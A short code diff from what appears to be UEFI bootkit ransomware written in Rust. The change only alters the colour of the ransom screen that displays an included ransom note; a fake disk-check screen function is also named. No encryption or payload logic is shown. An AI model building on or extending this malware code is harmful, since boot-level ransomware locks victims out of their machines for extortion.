@@ -37,7 +37,7 @@ fn init_chdsk_screen(st: &mut SystemTable<Boot>) -> uefi::Result {
 fn init_ransom_screen(st: &mut SystemTable<Boot>, id: &str) -> uefi::Result {
     st.stdout().clear()?;
     st.stdout().enable_cursor(true)?;
-    st.stdout().set_color(Color::Red, Color::Black)?;
+    st.stdout().set_color(Color::LightRed, Color::Black)?;
     st.stdout()
         .write_str(include_str!("include/ransom_note.txt"))
         .unwrap();
